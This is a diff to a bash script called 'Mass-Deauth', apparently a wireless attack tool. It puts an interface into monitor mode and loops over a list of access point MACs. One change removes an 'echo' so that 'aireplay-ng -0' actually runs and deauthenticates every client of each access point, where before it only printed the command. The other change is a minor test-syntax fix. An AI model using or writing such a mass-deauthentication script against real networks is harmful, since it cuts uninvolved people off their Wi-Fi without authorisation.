@@ -39,7 +39,7 @@ rmlogs
 
 xterm -geometry 75x12+464+288 -T "Mass-Deauth v$version - Start $WIFACE" -e "ip link set $WIFACE up" &
 
-while [ ! $moncheck ]; do
+while [[ ! $moncheck ]]; do
 	moncheck=`iw dev | awk '$0 ~ /Interface / {print $2}'`
 	xterm -geometry 75x10+464+446 -T "Mass-Deauth v$version - Start $MIFACE" -e "ip link set $WIFACE up && airmon-ng start $WIFACE"
 	moncheck=`iw dev | awk '$0 ~ /Interface / {print $2}'`
@@ -68,7 +68,7 @@ while true; do
 			scan1="1"
 			curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
 			echo -e "\e[01;32m[>]\e[00m Deauth'ing All Clients on $curAP ..."
-			xterm -geometry 75x9+464+446 -T "Mass-Deauth v$version" -e "echo aireplay-ng -0 $DEAUTHS -D -a $curAP $MIFACE" &
+			xterm -geometry 75x9+464+446 -T "Mass-Deauth v$version" -e "aireplay-ng -0 $DEAUTHS -D -a $curAP $MIFACE" &
 			curLine=$(($curLine+$x))
 	done
 	atk="1"
